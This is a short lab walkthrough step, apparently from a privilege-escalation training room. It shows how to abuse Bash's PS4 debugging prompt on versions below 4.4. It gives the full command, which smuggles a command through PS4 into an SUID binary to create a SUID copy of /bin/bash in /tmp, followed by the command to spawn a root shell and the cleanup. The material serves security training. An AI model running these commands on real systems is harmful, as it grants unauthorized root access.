# Abusing Shell Features (#2)

Note: This will not work on Bash versions 4.4 and above.

When in debugging mode, Bash uses the environment variable **PS4** to display an extra prompt for debugging statements.\


Run the **/usr/local/bin/suid-env2** executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:

`env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2`

Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

`/tmp/rootbash -p`

Remember to remove the /tmp/rootbash executable and exit out of the elevated shell before continuing as you will create this file again later in the room!

`rm /tmp/rootbash`\
`exit`
